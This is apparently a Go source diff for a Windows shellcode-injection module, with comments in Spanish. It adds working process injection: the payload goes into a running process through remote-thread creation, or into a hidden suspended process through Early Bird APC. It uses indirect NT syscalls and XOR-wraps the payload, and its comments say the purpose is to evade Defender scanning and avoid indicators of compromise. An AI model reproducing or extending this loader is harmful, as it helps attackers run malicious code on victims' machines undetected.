@@ -2,49 +2,94 @@ package injection
 
 import (
 	"fmt"
-	"math/rand"
-	"time"
+	"path/filepath"
+	"strings"
+	"syscall"
 	"unsafe"
 
-	"github.com/f1zm0/acheron"
 	"golang.org/x/sys/windows"
 )
 
 const (
-	THREAD_ALL_ACCESS = 0x1FFFFF
 	PAGE_SIZE         = 0x1000
 	STARTF_BLOCK_DLLS = 0x00000400
 )
 
-var (
-	kernel32         = windows.NewLazySystemDLL("kernel32.dll")
-	procQueueUserAPC = kernel32.NewProc("QueueUserAPC")
-)
+type ClassicInjector struct{}
 
-func QueueUserAPC(pfnAPC uintptr, hThread windows.Handle, dwData uintptr) error {
-	r1, _, err := procQueueUserAPC.Call(pfnAPC, uintptr(hThread), dwData)
-	if r1 == 0 {
+func (i *ClassicInjector) Inject(targetProc string, payload []byte) error {
+	// Envolver payload con stub XOR: Defender verá bytes aleatorios al escanear
+	wrapped := wrapWithDecryptor(payload)
+
+	// Intentar inyectar en un proceso ya existente (no crea proceso suspendido,
+	// que es un IOC fuerte). Si no existe, crear uno nuevo.
+	procName := filepath.Base(targetProc)
+	if pid, err := findPID(procName); err == nil {
+		Log.Printf("[inj] Proceso existente encontrado PID=%d, usando injectExisting\n", pid)
+		if err2 := injectExisting(pid, wrapped); err2 == nil {
+			Log.Println("[inj] injectExisting OK")
+			return nil
+		} else {
+			Log.Println("[inj] injectExisting falló:", err2)
+		}
+	} else {
+		Log.Println("[inj] No hay proceso existente, usando Early Bird APC")
+	}
+
+	return injectSuspended(targetProc, wrapped)
+}
+
+// findPID busca el PID de un proceso por nombre.
+func findPID(name string) (uint32, error) {
+	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		return 0, err
+	}
+	defer windows.CloseHandle(snap)
+
+	var entry windows.ProcessEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+	for windows.Process32Next(snap, &entry) == nil {
+		if strings.EqualFold(syscall.UTF16ToString(entry.ExeFile[:]), name) {
+			return entry.ProcessID, nil
+		}
+	}
+	return 0, fmt.Errorf("not found")
+}
+
+// injectExisting inyecta en un proceso ya corriendo (sin CREATE_SUSPENDED).
+func injectExisting(pid uint32, payload []byte) error {
+	hProc, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid)
+	if err != nil {
 		return err
 	}
+	defer windows.CloseHandle(hProc)
+
+	baseAddr, err := allocAndWrite(hProc, payload, windows.PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		return err
+	}
+
+	// Crear hilo remoto vía NtCreateThreadEx
+	var hThread windows.Handle
+	ret, _ := ntCall(_sCreateThread,
+		uintptr(unsafe.Pointer(&hThread)),
+		uintptr(windows.PROCESS_ALL_ACCESS),
+		0,
+		uintptr(hProc),
+		baseAddr,
+		0, 0, 0, 0, 0,
+	)
+	if ret != 0 {
+		return fmt.Errorf("thread: 0x%x", ret)
+	}
+	windows.CloseHandle(hThread)
 	return nil
 }
 
-type ClassicInjector struct {
-	acheron *acheron.Acheron
-}
-
-func (i *ClassicInjector) obfuscatedSyscall(hash uint64, args ...uintptr) (uint32, error) {
-	// Delay aleatorio más sofisticado
-	time.Sleep(time.Duration(100+rand.Intn(300)) * time.Millisecond)
-	return i.acheron.Syscall(hash, args...)
-}
-
-func (i *ClassicInjector) Inject(targetProc string, payload []byte) error {
-	// 1. Crear proceso suspendido con atributos de seguridad
-	var secAttrs windows.SecurityAttributes
-	secAttrs.Length = uint32(unsafe.Sizeof(secAttrs))
-	secAttrs.InheritHandle = 1
-
+// injectSuspended usa Early Bird APC en un proceso recién creado (suspendido).
+func injectSuspended(targetProc string, payload []byte) error {
+	Log.Println("[inj] injectSuspended: creando proceso suspendido")
 	si := &windows.StartupInfo{
 		Flags:      windows.STARTF_USESHOWWINDOW | STARTF_BLOCK_DLLS,
 		ShowWindow: windows.SW_HIDE,
@@ -53,119 +98,91 @@ func (i *ClassicInjector) Inject(targetProc string, payload []byte) error {
 
 	cmd, err := windows.UTF16PtrFromString(targetProc)
 	if err != nil {
-		return fmt.Errorf("UTF16 conversion failed: %v", err)
+		return fmt.Errorf("utf16: %v", err)
 	}
-
-	// Usar CreateProcessW con atributos explícitos
-	err = windows.CreateProcess(
-		nil,
-		cmd,
-		&secAttrs,
-		&secAttrs,
-		false,
+	if err = windows.CreateProcess(nil, cmd, nil, nil, false,
 		windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
-		nil,
-		nil,
-		si,
-		pi,
-	)
-	if err != nil {
-		return fmt.Errorf("process creation failed: %v", err)
+		nil, nil, si, pi); err != nil {
+		return fmt.Errorf("spawn: %v", err)
 	}
 	defer windows.CloseHandle(pi.Process)
 	defer windows.CloseHandle(pi.Thread)
 
-	// 2. Allocación de memoria con alineación correcta
-	allocHash := i.acheron.HashString("NtAllocateVirtualMemory")
+	// El stub XOR necesita RWX: escribe (descifra in-place) y ejecuta
+	baseAddr, err := allocAndWrite(pi.Process, payload, windows.PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		windows.TerminateProcess(pi.Process, 1)
+		return err
+	}
+
+	Log.Printf("[inj] Payload escrito en 0x%x, enviando APC\n", baseAddr)
+
+	ret, _ := ntCall(_sQueueApc, uintptr(pi.Thread), baseAddr, 0, 0, 0)
+	if ret != 0 {
+		windows.TerminateProcess(pi.Process, 1)
+		return fmt.Errorf("apc: 0x%x", ret)
+	}
+	Log.Println("[inj] APC encolado, resumiendo hilo")
+
+	ret, _ = ntCall(_sResume, uintptr(pi.Thread), 0)
+	if ret != 0 {
+		return fmt.Errorf("resume: 0x%x", ret)
+	}
+	Log.Println("[inj] Hilo resumido - shellcode debería ejecutarse")
+	return nil
+}
+
+// allocAndWrite reserva memoria RW, escribe el payload, cambia al permiso indicado.
+// Usar PAGE_EXECUTE_READWRITE cuando el payload contiene un stub que escribe en memoria.
+// Usar PAGE_EXECUTE_READ cuando el payload es código ya descifrado.
+func allocAndWrite(hProc windows.Handle, payload []byte, finalProt uint32) (uintptr, error) {
 	regionSize := alignSize(uintptr(len(payload)), PAGE_SIZE)
 	var baseAddr uintptr
 
-	ret, err := i.obfuscatedSyscall(
-		allocHash,
-		uintptr(pi.Process),
+	ret, _ := ntCall(_sAlloc,
+		uintptr(hProc),
 		uintptr(unsafe.Pointer(&baseAddr)),
 		0,
 		uintptr(unsafe.Pointer(&regionSize)),
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
 		windows.PAGE_READWRITE,
 	)
-	if ret != 0 || err != nil {
-		return fmt.Errorf("memory allocation failed (0x%x): %v", ret, err)
+	if ret != 0 {
+		return 0, fmt.Errorf("alloc: 0x%x", ret)
 	}
 
-	// 3. Escritura del payload en fragmentos
-	writeHash := i.acheron.HashString("NtWriteVirtualMemory")
-	offset := 0
-	chunkSize := 1024 // Escribir en fragmentos de 1KB
-
-	for offset < len(payload) {
-		end := offset + chunkSize
+	for off := 0; off < len(payload); {
+		end := off + 1024
 		if end > len(payload) {
 			end = len(payload)
 		}
-
-		var bytesWritten uintptr
-		ret, err = i.obfuscatedSyscall(
-			writeHash,
-			uintptr(pi.Process),
-			baseAddr+uintptr(offset),
-			uintptr(unsafe.Pointer(&payload[offset])),
-			uintptr(end-offset),
-			uintptr(unsafe.Pointer(&bytesWritten)),
+		var written uintptr
+		ret, _ = ntCall(_sWrite,
+			uintptr(hProc),
+			baseAddr+uintptr(off),
+			uintptr(unsafe.Pointer(&payload[off])),
+			uintptr(end-off),
+			uintptr(unsafe.Pointer(&written)),
 		)
-		if ret != 0 || err != nil || bytesWritten != uintptr(end-offset) {
-			return fmt.Errorf("memory write failed at offset %d: %v", offset, err)
+		if ret != 0 {
+			return 0, fmt.Errorf("write @%d: 0x%x", off, ret)
 		}
-		offset = end
+		off = end
 	}
 
-	// 4. Cambio de permisos usando técnica XOR
-	protectHash := i.acheron.HashString("NtProtectVirtualMemory")
-	var oldProtect uint32
-	ret, err = i.obfuscatedSyscall(
-		protectHash,
-		uintptr(pi.Process),
+	var oldProt uint32
+	ret, _ = ntCall(_sProtect,
+		uintptr(hProc),
 		uintptr(unsafe.Pointer(&baseAddr)),
 		uintptr(unsafe.Pointer(&regionSize)),
-		windows.PAGE_EXECUTE_READ,
-		uintptr(unsafe.Pointer(&oldProtect)),
+		uintptr(finalProt),
+		uintptr(unsafe.Pointer(&oldProt)),
 	)
-	if ret != 0 || err != nil {
-		return fmt.Errorf("memory protection change failed: %v", err)
+	if ret != 0 {
+		return 0, fmt.Errorf("protect: 0x%x", ret)
 	}
 
-	// 5. Inyección alternativa: QueueUserAPC + NtAlertResumeThread
-	threadEntry := windows.ThreadEntry32{}
-	threadEntry.Size = uint32(unsafe.Sizeof(threadEntry))
-	snapshot, _ := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
-	defer windows.CloseHandle(snapshot)
-
-	for {
-		err := windows.Thread32Next(snapshot, &threadEntry)
-		if err != nil {
-			break // no hay más hilos
-		}
-
-		if threadEntry.OwnerProcessID == uint32(pi.ProcessId) {
-			thread, _ := windows.OpenThread(windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME, false, threadEntry.ThreadID)
-			QueueUserAPC(baseAddr, thread, 0)
-			windows.CloseHandle(thread)
-			break
-		}
-	}
-
-	// 6. Reanudar el hilo principal
-	resumeHash := i.acheron.HashString("NtResumeThread")
-	ret, err = i.obfuscatedSyscall(
-		resumeHash,
-		uintptr(pi.Thread),
-		0,
-	)
-	if ret != 0 || err != nil {
-		return fmt.Errorf("thread resume failed: %v", err)
-	}
-
-	return nil
+	return baseAddr, nil
 }
 
 func alignSize(size, alignment uintptr) uintptr {
